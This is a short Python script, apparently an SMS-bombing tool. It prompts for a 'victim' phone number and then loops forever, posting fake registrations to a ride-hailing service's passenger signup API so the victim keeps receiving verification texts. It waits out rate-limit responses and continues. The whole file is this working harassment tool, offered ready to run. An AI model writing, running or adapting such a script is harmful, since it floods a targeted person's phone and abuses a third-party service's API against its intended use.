#!/usr/bin/python

import requests
import datetime
import sys
import time

RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
try:
	_phone = raw_input(GREEN+"Number Victim > "+RESET)
except KeyboardInterrupt:
	print RED+"[!] Exiting From Program [!]"+RESET
iteration = 1
print "Send The Spam To > ",_phone
while True:
	try:
		r = requests.post("https://p.grabtaxi.com/api/passenger/v2/profiles/register", data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'curl/7.52.1'})
	except KeyboardInterrupt:
		print RED+"[!] Exiting From Program [!]"+RESET
		sys.exit(1)
	except requests.exceptions.ConnectionError:
		print RED+"Connection Low Waiting 30s [!]"+RESET
		time.sleep(30)
	else:
		if r.status_code == 429:
			print RED+"Sleeping, wait 30s [!] "+RESET
			time.sleep(30)
		elif r.status_code == 200:
			print GREEN+"Success [+] send to "+RESET,_phone
			iteration += 1
			time.sleep(30)
		else:
			try:
				print RED+"[!] Exiting From Program [!]"+RESET
				sys.exit(1)
			except KeyboardInterrupt:
				print RED+"[!] Exiting From Program [!]"+RESET